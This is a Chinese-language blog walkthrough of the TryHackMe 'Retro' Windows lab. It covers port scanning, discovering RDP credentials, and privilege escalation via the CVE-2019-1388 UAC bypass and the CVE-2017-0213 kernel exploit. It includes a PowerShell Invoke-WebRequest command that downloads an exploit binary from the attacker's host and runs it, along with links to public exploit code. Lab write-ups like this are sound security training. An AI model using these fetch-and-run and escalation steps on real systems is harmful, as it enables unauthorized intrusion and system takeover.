---
title: "THM Retro"
description: "TryHackMe篇之Retro"

date: 2024-10-12T11:46:11+08:00
lastmod: 2025-11-11T12:12:40+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Windows
---
<!--more-->

> 靶机ip：10.10.52.12

# 写在前面

**注意：机器不响应ping命令**

# 信息收集

## nmap扫描

 `nmap --min-rate 10000 -Pn -sV -p- 10.10.52.12`

这里使用`-Pn`参数绕过ping命令的检查

![image-20241012124417135](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012124425580-746515289.png)

发现只开放了80和3389端口，这意味着当我们拿到一组凭据后，可以通过 rdp登录目标主机

## 80端口

![image-20241012125102563](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012125109670-1625718676.png)

是一个`windows server`默认的IIS服务

扫描一下目录

`gobuster dir -u http://10.10.52.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![image-20241012141138353](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012141145765-33043048.png)

访问一下`/retro`

![image-20241012143034753](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012143041958-931600745.png)

在页面最下面发现文章`Ready Player One`

![image-20241012143359676](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012143406701-1000163975.png)

根据文章意思猜测这是一组登录凭据`Wade : parzival`

# RDP登录远程主机

拿到一组用户凭据，结合之前的3389端口开放，尝试登录

`xfreerdp /u:Wade /p:parzival /cert:ignore /v:10.10.52.12`

![image-20241012143938820](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012143946216-981286449.png)

登陆成功

并在桌面找到user.txt

![image-20241012144053438](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012144100422-25041175.png)

# Windows提权

先进行windows主机信息搜集

桌面上有个浏览器，查看一下

![image-20241012144607785](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012144614643-1652594324.png)

发现该用户收藏了一个cve的页面，查看一下

![image-20241012144921303](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012144928489-1007257350.png)

是`CVE-2019-1388`

我们发现目标机的浏览器中有`CVE-2019-1388`的历史访问记录--猜测用户可能是想针对CVE-2019-1388漏洞打补丁，也就是说目标机器可能存在`CVE-2019-1388`漏洞

经过信息搜索可知`CVE-2019-1388`是一个UAC提权漏洞，该漏洞的基本信息如下：

> **UAC**:用户帐户控制(User Account Control)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。

> **CVE-2019-1388**：该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。在默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示 Secure Desktop；这些提示是由名为 consent.exe 的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。
>
> 因为用户可以与该UI交互，因此对UI来说紧限制是必须的，否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作，即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。
>
> [CVE-2019-1388漏洞利用](https://github.com/jas502n/CVE-2019-1388)

## 利用UAC漏洞提权

我们需要通过执行`hhupd.exe`文件来完成对CVE-2019-1388的利用，在目标机用户Wade 桌面上的回收站中我们可以找到`hhupd.exe`文件——我们手动恢复该文件即可

![image-20241012145525730](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012145533318-1767894072.png)

右键单击hhupd.exe文件并选择以管理员身份运行它，然后先点击"显示更多详细信息"，再继续点击"显示有关发布者证书的信息"

![image-20241012145630586](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012145637747-550169434.png)

![image-20241012145647626](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012145657684-1224412202.png)

![image-20241012145712577](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012145719391-978453998.png)

![image](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/2857591-20230308122357026-1060167176.png)

> 如果在上图界面中无法手动选择使用浏览器以打开链接--则需要我们重新部署一个目标机器并在通过RDP运行目标机上的hhupd.exe文件之前 先打开一个IE浏览器实例

因为目标机器没有连接到互联网，所以我们将在`Internet Explorer`浏览器中看到以下界面（这并不影响漏洞利用过程），此处其实是以系统级别的权限来打开浏览器，我们继续按`Alt`键弹出程序菜单栏，然后单击"另存为..."

![image-20241012150152799](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012150200066-2015236866.png)

![image-20241012150339873](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012150347911-676620041.png)

在弹出的窗口中输入`C:\Windows\System32\*.*`点击回车，定位到`System32`目录

![image-20241012150451317](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012150458156-990693367.png)

![image-20241012150538624](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012150545579-666682287.png)

然后在上面输入`cmd.exe`

![image-20241012150620038](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012150626890-48998100.png)



这里正常来说应该是可以提权成功的，但是我这里不知道是哪个步骤出错了，导致没有提权成功。。。

## 利用内核漏洞提权

通过`systeminfo`进行信息搜集

![image-20241012151542920](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012151549840-1471797610.png)

发现在这个版本下有 `CVE-2017-0213`漏洞

[ CVE-2017-0213漏洞利用](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip)

在kali机中下载以上 zip文件并通过`unzip`命令解压得到exe，然后传输该exe文件到靶机中，最后通过远程桌面直接执行该exe文件即可成功提权

![image-20241012152606663](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012152613938-1409594014.png)

起一个python服务

![image-20241012152648189](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012152654989-441442532.png)

```powershell
#在靶机cmd中使用Powershell的Invoke-WebRequest模块
Powershell Invoke-WebRequest -Uri http://10.14.90.122:81/CVE-2017-0213_x64.exe -OutFile exploit.exe

.\exploit.exe
#执行漏洞利用exe之后，我们能看到该漏洞利用程序生成了一个新的CMD shell且权限为Administrator——提权成功。
```

![image-20241012153954000](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012154001467-1487303658.png)

提权成功，拿到`system`权限

![image-20241012154043442](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241012154050259-1805537077.png)

在`c:/Users/Administrator/Desktop`找到`root.txt`